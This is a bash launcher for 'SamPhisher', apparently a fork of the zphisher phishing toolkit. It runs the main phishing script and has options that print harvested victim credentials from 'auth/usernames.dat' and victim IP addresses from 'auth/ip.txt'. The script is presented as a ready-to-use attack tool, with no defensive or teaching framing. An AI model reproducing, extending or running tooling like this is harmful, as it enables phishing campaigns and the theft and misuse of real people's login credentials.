#!/bin/bash

# https://github.com/SamSifisoMndebele/samphisher

if [[ $(uname -o) == *'Android'* ]];then
	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/samphisher"
else
	export ZPHISHER_ROOT="/opt/samphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run SamPhisher type \`samphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ZPHISHER_ROOT
	bash ./samphisher.sh
fi
